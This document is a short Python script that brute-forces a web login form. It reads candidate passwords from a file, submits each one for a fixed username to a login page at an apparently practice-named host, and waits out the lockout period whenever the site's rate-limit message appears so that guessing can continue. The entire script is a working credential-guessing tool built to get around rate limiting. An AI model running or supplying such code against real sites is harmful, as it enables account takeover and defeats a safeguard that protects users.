# This script can be used to brute force passwords on a site that has rate limiting.

import requests
import time
import sys

# Save password list to a file in CWD
pass_file = "passwords.txt"

url = "http://bruteforceme.com/login.php"

# Set rate limit in seconds here
lock_time = 31

# Message when rate limit is exceeded here
lock_message = "Too many login failures"

with open(pass_file, "r") as fh:
    for fline in fh:
        # Skip comment lines
        if fline.startswith("#"):
            continue

        username = "support.us"
        password = fline.rstrip()
        submit = "submit"

        # prepare POST data
        data = {
            "userid": username,
            "passwd": password,
            "submit": submit
        }
       
        res = requests.post(url, data=data)
        
        if "Invalid credentials" in res.text:
            print("[-] Invalid credentials: userid:{} passwd:{}".format(username, password))
        # Add additional 0.5 seconds to pause period
        elif lock_message in res.text:
            print("[-] Hit rate limit, sleeping 30")
            # Buffer sleep time 
            time.sleep(lock_time+0.5)
        else:
            print("[+] Valid credentials: userid:{} passwd:{}".format(username, password))
            sys.exit()
